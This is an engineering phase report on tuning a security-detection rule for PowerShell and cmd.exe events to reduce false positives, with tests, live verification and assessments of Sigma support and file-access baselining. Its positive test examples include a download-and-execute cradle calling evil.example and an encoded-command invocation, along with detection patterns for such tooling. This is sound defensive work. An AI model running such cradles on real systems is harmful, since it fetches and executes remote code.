# YAROX Phase 15 — Detection Quality & False-Positive Reduction

**Status:** D-1 fixed, tested, live-verified. D-3/D-5 assessed and scoped, not implemented this phase.

## 1. Audit — confirmed root cause, not assumed

Per the governing instruction ("do not assume every broad match is a false
positive — establish concrete examples"), the exact behavior was reproduced
directly against the running code before any change was made.

`detection/rules.py`'s `SuspiciousProcessExecution.match()` (pre-fix):

```python
if 'powershell' in raw or 'cmd.exe' in raw or '-enc' in raw or 'encodedcommand' in raw:
    return True
```

Run directly against three constructed, unambiguously benign process-creation
events:

| Command line | Old result |
|---|---|
| `cmd.exe /c echo build succeeded` | **matched** |
| `powershell.exe -File C:\Scripts\Get-DiskSpace.ps1` | **matched** |
| `"C:\Windows\System32\cmd.exe" /c npm run build` | **matched** |

All three matched under the pre-fix logic. In any environment where
PowerShell or `cmd.exe` are used for routine administration, automation, or
CI (nearly all Windows environments), this rule fires on a large fraction of
ordinary activity — a 100%-recall/100%-false-positive-rate substring match
is not a distinguishing signal, regardless of how many genuine attacks it
also happens to catch.

**Engine/dedup/correlation behavior, confirmed unchanged and not touched**
(per `detection/engine.py`, re-read fresh this phase): `DetectionEngine.
process_event` evaluates every rule (the Phase 13 D-1 first-match fix is
still in place, unmodified); evidence dedup keys on `(case_id, artifact,
evidence_type)`; MITRE technique dedup keys on `(case_id, technique_id)`;
case correlation (`correlation.engine.CorrelationEngine`) matches on
user/hostname within a 24h window. None of this needed to change — the
false-positive source was entirely inside one rule's match condition.

**Rules other than `SuspiciousProcessExecution` were audited, not assumed
clean.** `PrivilegeEscalation` (`'privilege' in evt_type`) and
`LateralMovement` (`'session'/'remote'/'login' in evt_type`) also use
substring matching, but against `event_type` — a short, connector-supplied
classification *label* (e.g. `"Privilege Escalation"`, `"User Logon"`), not
free-text `command_line` a user or attacker can shape arbitrarily. No
concrete false-positive example was found or constructed for either. Per
the explicit instruction not to assume every broad match is a defect, both
are left unchanged and are not claimed to be fixed.

## 2. Detection quality criteria — `SuspiciousProcessExecution`

| | |
|---|---|
| **Required fields** | `event_type` (taxonomy-classified as `PROCESS_EXECUTION`), `metadata.command_line` (or `raw_log.command_line` fallback) |
| **Match conditions** | Command line contains (a) an unambiguous token-prefix abbreviation of PowerShell's `-EncodedCommand` flag (`-enc` through the full name), or (b) a fileless download-and-execute cradle pattern (`Invoke-Expression`/`iex`, `DownloadString`/`DownloadFile`/`DownloadData`) |
| **Positive examples** | `powershell.exe -NoP -NonI -W Hidden -enc SQBFAFgA`; `powershell.exe -c IEX (New-Object Net.WebClient).DownloadString('http://evil.example/payload.ps1')` |
| **Negative examples** | `cmd.exe /c echo build succeeded`; `powershell.exe -File C:\Scripts\Get-DiskSpace.ps1`; a tool's own `-Encoding UTF8` flag (token-precise, does not collide) |
| **Evidence produced** | `EvidenceItem(evidence_type="PROCESS_EXECUTION")`, `reason` names the specific indicator that fired (new — see explainability below) |
| **Severity rationale** | HIGH, unchanged — both remaining indicators are narrow, well-documented malicious-tooling signatures (MITRE T1059.001), not volume/heuristic guesses |
| **Known blind spots** | A plain, non-obfuscated malicious invocation with no special flags on the command line (payload logic lives inside a referenced script file) is not caught by this rule alone — see §3's tradeoff discussion |

**Explainability improvement:** `explain()` now names which specific
indicator matched (`"an encoded/obfuscated command execution flag"` vs.
`"a fileless download-and-execute pattern"`) instead of a generic
"suspicious command line" message — a direct, low-risk improvement toward
this phase's stated explainability goal, verified live (see §6).

## 3. Implementation — smallest safe change, with a documented tradeoff

`backend/detection/rules.py`: two new module-level helpers
(`_has_encoded_command_flag`, `_DOWNLOAD_CRADLE_PATTERNS`) and a rewritten
`SuspiciousProcessExecution.match()`/`explain()`. No other rule, no
`detection/engine.py`, no `core/taxonomy.py`, no correlation/dedup logic
touched.

`_has_encoded_command_flag` is **token-precise, not substring-based**:
splits the command line on whitespace and checks whether any token is an
exact prefix of the canonical `-encodedcommand` string (length ≥ 4, so
`-enc` matches but a bare `-e` does not, avoiding excessive ambiguity from a
2-character token). This is why a tool's own `-Encoding UTF8` parameter does
not collide — `"-encodedcommand".startswith("-encoding")` is `False` (they
diverge at the 7th character), confirmed directly in Python before relying
on it.

**Deliberate, documented coverage tradeoff** (per the explicit instruction:
document, don't silently accept): removing the bare `'powershell' in raw`/
`'cmd.exe' in raw` checks means a plain malicious PowerShell/cmd invocation
with no encoded-command flag and no download cradle — e.g. `powershell.exe
-File malicious.ps1`, where the actual malicious logic is entirely inside
the referenced script and never appears on the command line YAROX
observes — is no longer flagged by this rule. This is judged an acceptable,
net-positive tradeoff, not a silent regression: the old rule "covered" that
case only by also flagging every legitimate script invocation using the
same interpreter, which is not real distinguishing capability. Reliably
closing this gap would need parent-process lineage, PowerShell script-block
logging, or file-content inspection — telemetry this system does not
currently ingest from any connector — out of scope for a keyword-matching
rule. This tradeoff is surfaced here, in the rule's own docstring, and in
the completion report; it was not silently accepted.

## 4. Tests

New `backend/tests/test_phase15_detection_quality.py` (25 tests):

- **Unit-level negatives** (7): the three originally-confirmed false
  positives, two more benign interpreter invocations, the `-Encoding`
  collision check, an empty command line.
- **Unit-level positives, preserved** (10): the exact fixture already used
  by `tests/test_sysmon_connector.py`'s end-to-end test (`-enc SQBFAFgA`),
  the full `-EncodedCommand` flag name, all 7 unambiguous prefix
  abbreviations parametrized, and — critically — `tests/
  test_phase13_detection.py`'s own D-1 multi-rule-overlap regression
  fixture (`7z.exe -enc a -tzip archive.zip sensitive.csv`), proving the
  fix does not require an interpreter process name and so does not
  silently invalidate what that earlier test claims to prove.
- **Unit-level positives, new capability** (5): three download-cradle
  variants, plus two tests confirming `explain()` now names the specific
  indicator.
- **Real-DB integration** (3): the two confirmed-benign cases produce zero
  cases and zero evidence through the real `detection_engine.process_event`
  pipeline (not just the isolated rule); the download-cradle case produces
  a real case with evidence traceable to the real event and citing the
  actual URL/method from the command line.

**Regression proof (not decorative):** `git stash push -- backend/
detection/rules.py` — the test module fails to even *import* against the
pre-fix code (`_has_encoded_command_flag` does not exist there), the
strongest possible proof of genuine dependency. `git stash pop` restored
all 25 passing.

**A real testing-infrastructure bug found and fixed while writing these
tests, unrelated to detection logic:** the first version of the unit-level
tests called `asyncio.run(rule.match(event))` from plain synchronous
`def test_...` functions. This ran successfully in isolation but, when run
as part of the full suite, corrupted asyncio's default-event-loop state for
every test after it in the same session — confirmed live: **87 unrelated
tests failed** with `"coroutine ... was never awaited"` on the first full-
suite run after adding the file. Root cause: `conftest.py` maintains one
custom session-scoped event loop for the whole pytest run; `asyncio.run()`
creates and closes a second, independent loop, which left the global
default-loop-policy state broken for whatever ran next. Fixed by making
every test that calls `rule.match()` a proper `@pytest.mark.asyncio async
def`, matching the convention every other test in this codebase already
follows — no manual event-loop management. Re-verified: the full suite
(`-m "not llm"`) went from 87 failures back to 0 after this fix.

## 5. Phase 14 scenarios as regression tests

Run against the revised engine, exactly as required:

- `docker compose exec backend pytest -v tests/test_scenario_orchestration.py -m "llm"` →
  **3 passed** in 386.49s: `test_investigation_timeout_is_reported_not_silently_passed`,
  `test_scenario_a_suricata_intrusion_alert_full_lifecycle` (still detects
  the Suricata intrusion alert — this rule is unrelated to
  `NetworkIntrusionAlert`, confirming no cross-rule interference),
  `test_scenario_b_insider_threat_archive_and_transfer_full_lifecycle`
  (still detects the archive-and-transfer pattern via
  `DataStagingViaArchiveUtility`/`LargeExternalDataTransfer` — neither rule
  was touched — and still correlates into one case).
- Scenario C (benign negative control) is not LLM-marked and was confirmed
  in the full non-LLM run below — remains a negative control (zero cases).
- No new scenario was added: the existing three already exercise
  `PROCESS_EXECUTION`-classified events end to end, and none of their
  fixtures happened to depend on `SuspiciousProcessExecution`'s old bare-
  keyword behavior, so no targeted new scenario was needed to expose a gap
  (per the instruction to add one only where a genuine gap is exposed).

## 6. Full test suite and live verification

- `docker compose exec backend pytest -q tests/ -m "not llm"` →
  **364 passed** (339 baseline + 25 new), confirming the event-loop bug is
  genuinely fixed (0 failures, not 87).
- `docker compose exec backend pytest -q tests/` (all markers) →
  **367 passed** (342 Phase 14 baseline + 25 new), zero regressions.
- **Live, on the running dev stack** (`docker compose restart backend
  celery_worker`, real `POST /events/ingest/sysmon`, real API-key auth,
  real Redis Streams, real Postgres — not the isolated test database):
  - A real benign `cmd.exe /c echo build succeeded` event → stored, **zero**
    `EvidenceItem` rows — confirmed by direct SQL query, not assumed.
  - A real PowerShell download-cradle event
    (`IEX (New-Object Net.WebClient).DownloadString(...)`) → a real
    `InvestigationCase` ("Command and Scripting Interpreter", HIGH) with a
    real `EvidenceItem` whose `reason` correctly names the fired indicator
    ("a fileless download-and-execute pattern") and quotes the actual
    command line — confirmed the real Celery-dispatched investigation
    reached a terminal state before deleting the verification rows,
    following the same wait-then-cleanup discipline established in every
    prior phase.

## 7. D-3 (Sigma engine) — assessed, not implemented

**Does the current engine support the rules YAROX needs?** No. Re-read
`rules/sigma/engine.py` fresh this phase (unchanged since Phase 13):

- Only a single flat `selection` block with implicit AND across fields —
  **no `condition` expression support at all** (no `and`/`or`/`not`, no
  `1 of selection*`/`all of selection*`). Real Sigma rules — including the
  one already shipped in this repo — use `condition: selection`, the
  simplest possible case; anything with a `filter` (a near-universal Sigma
  pattern for excluding known-benign matches, e.g. `condition: selection
  and not filter`) cannot be expressed at all today.
- Only two modifiers: `contains` and implicit `exact`. The standard Sigma
  modifier set also includes `startswith`, `endswith`, `re` (regex), `all`
  (require every value in a list), numeric comparisons, and list-valued
  fields meaning OR-of-values — none supported.
- **No field-name mapping layer.** Real, unmodified Sigma content (e.g. the
  public SigmaHQ ruleset) is written against Sysmon/Windows field names
  (`Image`, `CommandLine`, `ParentImage`). YAROX's own canonical metadata
  uses different names (`process_name`, `command_line`, `parent_process`).
  `SigmaRule.match()` reads `event_metadata.get(actual_field)` directly, so
  an imported rule referencing `Image` would silently never match anything
  in YAROX's own data, regardless of the above two gaps being fixed. The
  one existing rule works only because it was hand-authored specifically
  against YAROX's field names and the engine's limited capability — its
  existence is not evidence the engine can consume genuine Sigma content.

**Concrete gaps remaining:** condition-expression evaluation, the standard
modifier set, and a logsource-aware field-mapping layer — all three are
required together before a single unmodified rule from a real Sigma
ruleset could be expected to work correctly.

**Proposed scoped plan (not implemented this phase):**
1. A small boolean-expression evaluator for the `condition` field
   (`and`/`or`/`not`, parentheses, `1 of x*`/`all of x*`).
2. Expand modifiers to the common subset (`startswith`, `endswith`, `re`,
   `all`, list-valued-field OR semantics).
3. A field-mapping table per `logsource.category` (e.g. `process_creation`
   → `{Image: process_name, CommandLine: command_line, ...}`) applied
   before evaluation.
4. Curate an initial 5–10 well-known, low-false-positive SigmaHQ rules
   matching telemetry YAROX actually ingests (process creation, network
   connection) as a pilot — not a bulk import of the full public ruleset,
   which is tuned for far more telemetry sources than this system has.
5. Tests: the condition parser (each construct), field mapping, and at
   least one end-to-end test proving an *unmodified* imported rule matches
   real YAROX telemetry.

## 8. D-5 (file-access baselining) — assessed, not implemented

**Is current file-access telemetry sufficient for meaningful baselining?**
No, and the gap is telemetry, not just code. What exists today: Sysmon
EventID 11 (File **Create** only — no read/modify/delete differentiation)
via `plugins/parsers/sysmon.py`, carrying exactly `process_name` and
`target_filename` — no file size, no hash, no sensitivity classification,
and critically no historical per-user/per-resource access record to
establish what "normal" looks like. The `datasets/insider_threat` fixture's
"File Access" events (including the one pre-labeled `"reason": "Unusual
access pattern"`) are not a counterexample: that label is baked into the
fixture as ground truth for evaluation, not a raw signal YAROX could
compute a baseline from — using it as if it demonstrated sufficient
telemetry would be circular.

**What would be needed for real baselining:** a genuine file-access
(not just create) event stream tagged with who/what/when; some notion of
resource sensitivity (explicit tagging or path-pattern inference); and a
persistent per-user/per-resource history to compute deviation from a norm.
None of this exists in YAROX's current schema or connectors.

**A narrower, buildable fallback exists but is explicitly not the same
thing as baselining:** `detection/state.py`'s existing Redis-backed
sliding-window/distinct-value infrastructure (already used by
`LateralMovement`) could be applied to Sysmon EventID 11 events to flag an
unusually high *volume* or *distinct-file-count* of file creations from one
user/host in a window — a legitimate, buildable heuristic using telemetry
YAROX already ingests, but materially narrower than statistical
normal-behavior baselining, and not proposed as a substitute for it.

## 9. Which was chosen, and why

Per the instruction not to implement both without a clear dependency
reason: **neither was implemented this phase.** Between the two, D-3 has
the clearer, telemetry-independent path to real value (unlocking a large
ecosystem of pre-vetted community detection content); D-5 is blocked on
telemetry this system does not currently collect, not merely on code not
yet written. If one must be picked next, D-3 is recommended — its
prerequisites are entirely within this codebase's control, unlike D-5's.

## 10. Completion criterion

D-1's confirmed, concretely-demonstrated false-positive source is fixed
with a minimal, scoped, documented change; the coverage tradeoff is
surfaced explicitly, not hidden; 25 regression tests cover every confirmed
false positive and every preserved/new legitimate positive, proven to
genuinely depend on the fix via `git stash`; all three Phase 14 real-stack
scenarios (plus the timeout test) still pass unmodified; the full suite
(367) has zero regressions; live verification against the real running
stack confirms both the false-positive elimination and the new detection
capability with real evidence text. D-3 and D-5 are assessed with concrete
evidence and a scoped-but-unimplemented plan, per instruction.
